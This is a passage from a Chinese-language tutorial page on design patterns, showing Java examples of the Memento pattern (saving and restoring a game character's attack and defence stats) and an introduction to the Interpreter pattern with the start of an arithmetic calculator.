集合&gt;</p></li></ol><h2 id="实现-16"><a class="markdownIt-Anchor" href="#实现-16"></a> 实现</h2><h3 id="简单实现"><a class="markdownIt-Anchor" href="#简单实现"></a> 简单实现</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104163106314.png" alt="image-20230104163106314" /></p><p><code>Caretaker.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Caretaker</span> &#123;<br>   <br>   <span class="hljs-comment">//在List 集合中会有很多的备忘录对象</span><br>   <span class="hljs-keyword">private</span> List&lt;Memento&gt; mementoList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Memento&gt;();<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      mementoList.add(memento);<br>   &#125;<br>   <br>   <span class="hljs-comment">//获取到第index个Originator 的 备忘录对象(即保存状态)</span><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span> &#123;<br>      <span class="hljs-keyword">return</span> mementoList.get(index);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <br>      <span class="hljs-type">Originator</span> <span class="hljs-variable">originator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Originator</span>();<br>      <span class="hljs-type">Caretaker</span> <span class="hljs-variable">caretaker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Caretaker</span>();<br>      <br>      originator.setState(<span class="hljs-string">&quot; 状态#1 攻击力 100 &quot;</span>);<br>      <br>      <span class="hljs-comment">//保存了当前的状态</span><br>      caretaker.add(originator.saveStateMemento());<br>      <br>      originator.setState(<span class="hljs-string">&quot; 状态#2 攻击力 80 &quot;</span>);<br>      <br>      caretaker.add(originator.saveStateMemento());<br>      <br>      originator.setState(<span class="hljs-string">&quot; 状态#3 攻击力 50 &quot;</span>);<br>      caretaker.add(originator.saveStateMemento());<br>      <br>      <br>      <br>      System.out.println(<span class="hljs-string">&quot;当前的状态是 =&quot;</span> + originator.getState());<br>      <br>      <span class="hljs-comment">//希望得到状态 1, 将 originator 恢复到状态1</span><br>      <br>      originator.getStateFromMemento(caretaker.get(<span class="hljs-number">0</span>));<br>      System.out.println(<span class="hljs-string">&quot;恢复到状态1 , 当前的状态是&quot;</span>);<br>      System.out.println(<span class="hljs-string">&quot;当前的状态是 =&quot;</span> + originator.getState());<br><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Memento.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memento</span> &#123;<br>   <span class="hljs-keyword">private</span> String state;<br><br>   <span class="hljs-comment">//构造器</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Memento</span><span class="hljs-params">(String state)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.state = state;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> state;<br>   &#125;<br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Originator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.theory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Originator</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String state;<span class="hljs-comment">//状态信息</span><br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> state;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(String state)</span> &#123;<br>        <span class="hljs-built_in">this</span>.state = state;<br>    &#125;<br><br>    <span class="hljs-comment">//编写一个方法，可以保存一个状态对象 Memento</span><br>    <span class="hljs-comment">//因此编写一个方法，返回 Memento</span><br>    <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">saveStateMemento</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memento</span>(state);<br>    &#125;<br><br>    <span class="hljs-comment">//通过备忘录对象，恢复状态</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getStateFromMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>        state = memento.getState();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">当前的状态是 = 状态<span class="hljs-meta">#3 攻击力 50 </span><br>恢复到状态<span class="hljs-number">1</span> , 当前的状态是<br>当前的状态是 = 状态<span class="hljs-meta">#1 攻击力 100 </span><br></code></pre></td></tr></table></figure><h3 id="游戏角色恢复状态"><a class="markdownIt-Anchor" href="#游戏角色恢复状态"></a> 游戏角色恢复状态</h3><p>游戏角色有攻击力和防御力，在大战 Boss 前保存自身的状态(攻击力和防御力)，当大战 Boss 后攻击力和防御力下降，从备忘录对象恢复到大战前的状态</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104163634868.png" alt="image-20230104163634868" /></p><p><code>Caretaker.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-comment">//守护者对象, 保存游戏角色的状态</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Caretaker</span> &#123;<br><br>   <span class="hljs-comment">//如果只保存一次状态</span><br>   <span class="hljs-keyword">private</span> Memento  memento;<br>   <span class="hljs-comment">//对GameRole 保存多次状态</span><br>   <span class="hljs-comment">//private ArrayList&lt;Memento&gt; mementos;</span><br>   <span class="hljs-comment">//对多个游戏角色保存多个状态</span><br>   <span class="hljs-comment">//private HashMap&lt;String, ArrayList&lt;Memento&gt;&gt; rolesMementos;</span><br><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">getMemento</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> memento;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      <span class="hljs-built_in">this</span>.memento = memento;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//创建游戏角色</span><br>      <span class="hljs-type">GameRole</span> <span class="hljs-variable">gameRole</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GameRole</span>();<br>      gameRole.setVit(<span class="hljs-number">100</span>);<br>      gameRole.setDef(<span class="hljs-number">100</span>);<br>      <br>      System.out.println(<span class="hljs-string">&quot;和boss大战前的状态&quot;</span>);<br>      gameRole.display();<br>      <br>      <span class="hljs-comment">//把当前状态保存caretaker</span><br>      <span class="hljs-type">Caretaker</span> <span class="hljs-variable">caretaker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Caretaker</span>();<br>      caretaker.setMemento(gameRole.createMemento());<br>      <br>      System.out.println(<span class="hljs-string">&quot;和boss大战~~~&quot;</span>);<br>      gameRole.setDef(<span class="hljs-number">30</span>);<br>      gameRole.setVit(<span class="hljs-number">30</span>);<br>      <br>      gameRole.display();<br>      <br>      System.out.println(<span class="hljs-string">&quot;大战后，使用备忘录对象恢复到站前&quot;</span>);<br>      <br>      gameRole.recoverGameRoleFromMemento(caretaker.getMemento());<br>      System.out.println(<span class="hljs-string">&quot;恢复后的状态&quot;</span>);<br>      gameRole.display();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>GameRole.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameRole</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> vit;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> def;<br>   <br>   <span class="hljs-comment">//创建Memento ,即根据当前的状态得到Memento</span><br>   <span class="hljs-keyword">public</span> Memento <span class="hljs-title function_">createMemento</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memento</span>(vit, def);<br>   &#125;<br>   <br>   <span class="hljs-comment">//从备忘录对象，恢复GameRole的状态</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recoverGameRoleFromMemento</span><span class="hljs-params">(Memento memento)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = memento.getVit();<br>      <span class="hljs-built_in">this</span>.def = memento.getDef();<br>   &#125;<br>   <br>   <span class="hljs-comment">//显示当前游戏角色的状态</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;游戏角色当前的攻击力：&quot;</span> + <span class="hljs-built_in">this</span>.vit + <span class="hljs-string">&quot; 防御力: &quot;</span> + <span class="hljs-built_in">this</span>.def);<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVit</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> vit;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVit</span><span class="hljs-params">(<span class="hljs-type">int</span> vit)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> def;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(<span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>Memento.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.memento.game;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Memento</span> &#123;<br><br>   <span class="hljs-comment">//攻击力</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> vit;<br>   <span class="hljs-comment">//防御力</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> def;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Memento</span><span class="hljs-params">(<span class="hljs-type">int</span> vit, <span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getVit</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> vit;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setVit</span><span class="hljs-params">(<span class="hljs-type">int</span> vit)</span> &#123;<br>      <span class="hljs-built_in">this</span>.vit = vit;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> def;<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(<span class="hljs-type">int</span> def)</span> &#123;<br>      <span class="hljs-built_in">this</span>.def = def;<br>   &#125;<br>   <br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>执行程序，输出结果：</p></blockquote><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">和boss大战前的状态</span><br><span class="hljs-attribute">游戏角色当前的攻击力：100 防御力</span><span class="hljs-punctuation">:</span> <span class="hljs-string">100</span><br><span class="hljs-attribute">和boss大战~~~</span><br><span class="hljs-attribute">游戏角色当前的攻击力：30 防御力</span><span class="hljs-punctuation">:</span> <span class="hljs-string">30</span><br><span class="hljs-attribute">大战后，使用备忘录对象恢复到站前</span><br><span class="hljs-attribute">恢复后的状态</span><br><span class="hljs-attribute">游戏角色当前的攻击力：100 防御力</span><span class="hljs-punctuation">:</span> <span class="hljs-string">100</span><br></code></pre></td></tr></table></figure><h2 id="备忘录模式的注意事项和细节"><a class="markdownIt-Anchor" href="#备忘录模式的注意事项和细节"></a> 备忘录模式的注意事项和细节</h2><ol><li><p>给用户提供了一种可以恢复状态的机制，可以使用户能够比较方便地回到某个历史的状态</p></li><li><p>实现了信息的封装，使得用户不需要关心状态的保存细节</p></li><li><p>如果类的成员变量过多，势必会占用比较大的资源，而且每一次保存都会消耗一定的内存, 这个需要注意</p></li><li><p>适用的应用场景：</p><ul><li>1、后悔药。</li><li>2、打游戏时的存档。</li><li>3、Windows 里的 ctri + z。</li><li>4、IE 中的后退。</li><li>5、数据库的事务管理</li></ul></li></ol><h1 id="解释器模式"><a class="markdownIt-Anchor" href="#解释器模式"></a> 解释器模式</h1><p>解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL<br />解析、符号处理引擎等。</p><h2 id="介绍-19"><a class="markdownIt-Anchor" href="#介绍-19"></a> 介绍</h2><p><strong>意图：</strong> 给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。</p><p><strong>主要解决：</strong> 对于一些固定文法构建一个解释句子的解释器。</p><p><strong>何时使用：</strong><br />如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。</p><p><strong>如何解决：</strong> 构建语法树，定义终结符与非终结符。</p><p><strong>关键代码：</strong> 构建环境类，包含解释器之外的一些全局信息，一般是 HashMap。</p><p><strong>应用实例：</strong> 编译器、运算表达式计算。</p><p><strong>优点：</strong> 1、可扩展性比较好，灵活。 2、增加了新的解释表达式的方式。 3、易于实现简单文法。</p><p><strong>缺点：</strong> 1、可利用场景比较少。 2、对于复杂的文法比较难维护。 3、解释器模式会引起类膨胀。 4、解释器模式采用递归调用方法。</p><p><strong>使用场景：</strong> 1、可以将一个需要解释执行的语言中的句子表示为一个抽象语法树。 2、一些重复出现的问题可以用一种简单的语言来进行表达。<br />3、一个简单语法需要解释的场景。</p><p><strong>注意事项：</strong> 可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104170305404.png" alt="image-20230104170305404" /></p><p>对原理类图的说明-即(解释器模式的角色及职责)</p><ol><li><p>Context: 是环境角色,含有解释器之外的全局信息.</p></li><li><p>AbstractExpression: 抽象表达式， 声明一个抽象的解释操作,这个方法为抽象语法树中所有的节点所共享</p></li><li><p>TerminalExpression: 为终结符表达式, 实现与文法中的终结符相关的解释操作</p></li><li><p>NonTermialExpression: 为非终结符表达式，为文法中的非终结符实现解释操作.</p></li><li><p>说明： 输入 Context he TerminalExpression 信息通过 Client 输入即可</p></li></ol><h2 id="实现-17"><a class="markdownIt-Anchor" href="#实现-17"></a> 实现</h2><p>应用实例要求</p><p>通过解释器模式来实现四则运算，</p><p>如计算 a+b-c 的值</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230104185525137.png" alt="image-20230104185525137" /></p><p><code>AddExpression.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 加法解释器</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddExpression</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SymbolExpression</span>  &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">AddExpression</span><span class="hljs-params">(Expression left, Expression right)</span> &#123;<br>      <span class="hljs-built_in">super</span>(left, right);<br>   &#125;<br><br>   <span class="hljs-comment">//处理相加</span><br>   <span class="hljs-comment">//var 仍然是 &#123;a=10,b=20&#125;..</span><br>   <span class="hljs-comment">//一会我们debug 源码,就ok</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">interpreter</span><span class="hljs-params">(HashMap&lt;String, Integer&gt; <span class="hljs-keyword">var</span>)</span> &#123;<br>      <span class="hljs-comment">//super.left.interpreter(var) ： 返回 left 表达式对应的值 a = 10</span><br>      <span class="hljs-comment">//super.right.interpreter(var): 返回right 表达式对应值 b = 20</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.left.interpreter(<span class="hljs-keyword">var</span>) + <span class="hljs-built_in">super</span>.right.interpreter(<span class="hljs-keyword">var</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Calculator.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.interpreter;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Stack;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br><br>   <span class="hljs-comment">// 定义表达式</span><br>   <span class="hljs-keyword">private</span> Expression expression;<br><br>   <span class="hljs-comment">// 构造函数传参，并解析</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calculator</span><span class="hljs-params">(String expStr)</span> &#123; <span class="hljs-comment">// expStr = a+b</span><br>      <span class="hljs-comment">// 安排运算先后顺序</span><br>      Stack&lt;Expression&gt; stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>      <span class="hljs-comment">// 表达式拆分成字符数组 </span><br>      <span class="hljs-type">char</span>[] charArray = expStr.toCharArray();<span class="hljs-comment">// [a, +, b]</span><br><br>      <span class="hljs-type">Expression</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">Expression</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-comment">//遍历我们的字符数组， 即遍历  [a, +, b]</span><br>      <span class="hljs-comment">//针对不同的情况，做处理</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; charArray.length; i++) &#123;<br>         <span class="hljs-keyword">switch</span> (charArray[i]) &#123;<br>         <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>: <span class="hljs-comment">//</span><br>            left = stack.pop();<span class="hljs-comment">// 从stack取出left =&gt; &quot;a&quot;</span><br>            right = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VarExpression</span>(String.valueOf(charArray[++i]));<span class="hljs-comment">// 取出右表达式 &quot;b&quot;</span><br>            stack.push(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AddExpression</span>(left, right));<span class="hljs-comment">// 然后根据得到left 和 right 构建 AddExpresson加入stack</span><br>            <span 